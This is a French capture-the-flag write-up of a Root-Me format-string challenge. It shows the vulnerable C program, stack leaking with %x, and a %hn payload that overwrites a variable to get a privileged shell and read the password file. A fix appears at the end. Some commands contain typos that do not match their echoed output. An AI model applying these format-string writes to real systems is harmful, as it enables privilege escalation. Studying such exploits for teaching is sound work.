# L’épopée Root-Me : App - Système | ELF x86 - Format string bug basic 2

## 1. Informations Générales & Configuration de l'Environnement

| Protection | Nom complet | État |
| :--- | :--- | :---: |
| **PIE** | Position Independent Executable | [❌] 
| **RelRO** | Read Only relocations | [❌] |
| **NX** | Pile non exécutable | [✔️] |
| **Heap exec** | Tas non exécutable | [✔️] |
| **ASLR** | Distribution aléatoire de l'espace d'adressage | [❌] |
| **SF** | Source Fortification | [❌] |
| **SSP** | Stack-Smashing Protection | [✔️] |
| **SRC** | Accès au code source | [✔️] |

---

## 2. Analyse du Code Source

```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <sys/types.h>
    #include <unistd.h>
     
    int main( int argc, char ** argv )
     
    {
     
            int var;
            int check  = 0x04030201;
     
            char fmt[128];
     
            if (argc <2)
                    exit(0);
     
            memset( fmt, 0, sizeof(fmt) );
     
            printf( "check at 0x%x\n", &check );
            printf( "argv[1] = [%s]\n", argv[1] );
     
            snprintf( fmt, sizeof(fmt), argv[1] );
     
            if ((check != 0x04030201) && (check != 0xdeadbeef))    
                    printf ("\nYou are on the right way !\n");
     
            printf( "fmt=[%s]\n", fmt );
            printf( "check=0x%x\n", check );
     
            if (check==0xdeadbeef)
            {
                    printf("Yeah dude ! You win !\n");
                    setreuid(geteuid(), geteuid());
                    system("/bin/bash");
            }
    }
```

### Le challenge :

La première étape de ce challenge va être la lecture du code. Voici les informations notables :

- Une adresse est stockée dans check, et elle est vérifiée, si elle vaut 0xdeadbeef ça appelle une fonction qui ouvre un terminal privilégié.
- L'adresse de check, contenu dans check et le contenu de fmt est affiché.
- fmt prend 128 octets en mémoire et le contenu de argv[1] est passé dedans.

Une première faille semble me sauter aux yeux : snprintf est censé prendre en 3ème argument le formatage, (comme printf) ici c'est ce qui est passé en argument. C'est ici qu'on va attaquer probablement.

---

## 3. Exploitation & Démarche de Résolution

### Étape 1 : Déroulement basique du script

Tout d'abord, on va vérifier le déroulement basique du programme :

```bash
app-systeme-ch14@challenge02:~$ ./ch14 aaaaaaaaa
check at 0xbffffac8
argv[1] = [aaaaaaaaa]
fmt=[aaaaaaaaa]
check=0x4030201
app-systeme-ch14@challenge02:~$ ./ch14 AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
check at 0xbffffaa8                                                                                                 
argv[1] = [AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x]                                                         
fmt=[AAAA.80485f1.0.0.c2.bffffbf4.b7fe1449.f63d4e2e.4030201.41414141.3430382e.31663538.302e302e.2e32632e.66666662] 
check=0x4030201                                                                                 
```

On voit plusieurs cas de figures :
- Le comportement normal affiche bien le contenu, et l'adresse de check ainsi que le contenu de fmt
- Comme prévu, le formatage passe sur fmt. On a même l'offset où l'on va injecter le payload (ici 41414141 (AAAA en hex)) donc a 9 octets.

### Étape 2 : Identification de la vulnérabilité

La vulnérabilité étant identifiée on peut passer à la suite.

### Étape 3 : Analyse du comportement

Ici, comme expliqué, le formatage permet d'accéder à des adresses mémoires mais aussi d'écrire et donc de potentiellement écraser la valeur de check puisque on connait son adresse mémoire. Le snprintf devient pour nous comme un naigateur dans le code.

### Étape 4 : Exploitation

Maintenant que nous avons trouvé une solution, nous allons passer à l'action :

```bash
app-systeme-ch14@challenge02:~$ ./ch14 AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
check at 0xbffffaa8
```
On va injecter l'adresse de check pour commencer (en little endian) puis on va injecter 0xbeef puis 0xdead (dans cet ordre puisque little endian.

```bash
app-systeme-ch14@challenge02:~$ ./ch14 $( python -c 'print "\xa8\xfa\xff\xbf\xaa\xfa\xff\xbf" + "%48871%9$hn%8126%1$hn"'
)
check at 0xbffffab8
argv[1] = [��������%48871%9$hn%8126%10$hn]
fmt=[��������%9$hn%10$hn]
check=0x4030201
```
L'adresse a changé puisque la taille de ce qu'on a envoyé a changé, et en plus j'ai fait une erreur de frappe, modifions cela : 

```bash
app-systeme-ch14@challenge02:~$ ./ch14 $( python -c 'print "\xb8\xfa\xff\xbf\xba\xfa\xff\xbf" + "%48871c%9$hn%8126c10$hn"'
)
check at 0xbffffab8
argv[1] = [��������%48871c%9$hn%8126c%10$hn]
fmt=[��������                                                                                                                      ]
check=0xdeadbeef
Yeah dude ! You win !
app-systeme-ch14-cracked@challenge02:~$ cat .passwd
************************
```

Le mot de passe est en poche. Le payload est simple, on envoie l'adresse mémoire de check en little endian. Ensuite à partir de là, on écrit 48871 octets (48879 est 0xbeef en décimal et on enlève 8 parce qu'on a écrit les 8 octets de l'adresse de check) à l'offset 9 (sinon on va écraser d'autres données et provoquer une segfault) et on utilise $hn pour compter les octets écrit et écrire le nombre à l'adresse voulu. ici la première adresse donnée, celle écrite à l'offset 9, celle de check. Donc on a 0xbeef, ensuite on ajoute 8126 caractères (0xdead - 0xbeef) et on écrit donc 0xdead cette fois à l'offset 10 qui contient check + 2. On a donc 0xdeadbeef dans check.

---

## 4. Comment se protéger ?

Ici, l'erreur venait de snprintf qui utilisait argv à la place de l'argument censé être le formatage.

Pour corriger ce problème, la solution est simplement de mettre %s par exemple en 3ème argument et argv en 4ème afin de l'afficher en toute sécurité.
